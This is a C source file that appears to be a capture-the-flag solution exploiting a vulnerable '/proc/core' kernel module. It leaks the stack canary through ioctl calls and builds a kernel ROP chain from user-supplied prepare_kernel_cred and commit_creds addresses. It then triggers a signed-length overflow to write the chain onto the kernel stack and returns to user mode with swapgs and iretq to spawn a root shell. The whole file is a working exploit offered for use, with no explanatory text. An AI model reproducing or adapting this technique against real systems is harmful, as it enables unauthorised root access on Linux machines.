#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

unsigned long int user_cs,user_ss,user_rsp,user_flag;

void save_state(){
    __asm__("mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_rsp,rsp;"
            "pushf;"
            "pop user_flag;"
           );
    puts("[*]Save the state!");
}

void getshell(){
    system("/bin/sh");
}

int main(){
    save_state();
    unsigned long int *tcach = (unsigned long int *)malloc(0x40);
    
    unsigned long int pkd_addr,cc_addr;
    scanf("%lx",&pkd_addr);
    fflush(stdin);
    printf("input the cc_addr:\n");
    scanf("%lx",&cc_addr);

    int fd = open("/proc/core",2);

    ioctl(fd,1719109788,0x40);
    ioctl(fd,1719109787,tcach);
    unsigned long canary_ = *tcach;
    //unsigned long vm_base = *(tcach+0x10) - 0x19b;
    printf("leak canary:%x\n",canary_);
    //printf("leak vm_base:%p",vm_base);
    
    unsigned long offset_size = pkd_addr - 0xffffffff8109cce0;// qemu addr - local addr
    
    //ret_offset = 0x50 canary = 0x40
    unsigned long int rop_content[] = {
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    canary_,
    0x9090909090909090,
    0xffffffff81000b2f+offset_size, //pop rdi;ret
    0x0,
    pkd_addr,
    0xffffffff810a0f49+offset_size, //pop rdx;ret
    cc_addr,
    0xffffffff8106a6d2+offset_size, //mov rdi,rax;jmp rdx
    0xffffffff81a012da+offset_size, //swapgs;popfq;ret
    0,
    0xffffffff81050ac2+offset_size, //iretq;
    (unsigned long)getshell,
    user_cs,
    user_flag,
    user_rsp,
    user_ss
    };

    write(fd,rop_content,0xf0);
    ioctl(fd,1719109786,0xffffffff000000f0);//-1 will be 4 size

    return 0;
}
